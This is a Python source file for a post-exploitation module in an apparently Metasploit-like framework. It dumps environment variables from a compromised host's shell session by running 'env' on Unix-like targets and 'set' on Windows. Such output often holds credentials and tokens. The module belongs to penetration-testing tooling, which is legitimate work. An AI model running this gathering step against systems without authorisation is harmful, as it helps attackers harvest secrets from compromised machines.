from collections.abc import Mapping, Sequence

from teralibs.tsf.base.post import PLATFORM_LINUX, PLATFORM_UNIX, PLATFORM_WINDOWS, Post


class TerasploitModule(Post):
    """Dump the remote environment via the active shell session."""

    NAME: str = "Multi Gather Environment Variables"
    DESCRIPTION: str = "Collect environment variables from the active shell session. Works against UNIX (env) and Windows (set) targets."
    AUTHOR: Sequence = ["4steroth"]
    LICENSE: str = "BSD-3-CLAUSE"
    VERSION: str = "1.0"
    RANK: str = "normal"
    REFERENCES: Sequence = ["MSF - post/multi/gather/env"]
    PLATFORM: Sequence = [PLATFORM_LINUX, PLATFORM_UNIX, PLATFORM_WINDOWS]
    SESSION_TYPES: Sequence = ["shell"]

    # Platform-to-command mapping.  Windows shells use ``set``;
    # everything else uses ``env``.
    CMD: Mapping = {"windows": "set"}
    CMD_DEFAULT = "env"

    def run(self, ctx):
        """Dump the environment to the console."""

        platform = ctx.session.platform.lower()
        cmd = self.CMD.get(platform, self.CMD_DEFAULT)

        ctx.info(f"Gathering environment variables via '{cmd}' ...")

        try:
            ctx.session.send_command(cmd)
            output = ctx.session.read_output(timeout=10.0)
        except RuntimeError as exc:
            ctx.error(f"Session error: {exc}")
            return

        if not output.strip():
            ctx.warning("No output received - session may be unresponsive.")
            return

        ctx.success("Environment variables:")
        for line in output.splitlines():
            line = line.strip()
            if line:
                ctx.info(f"  {line}")
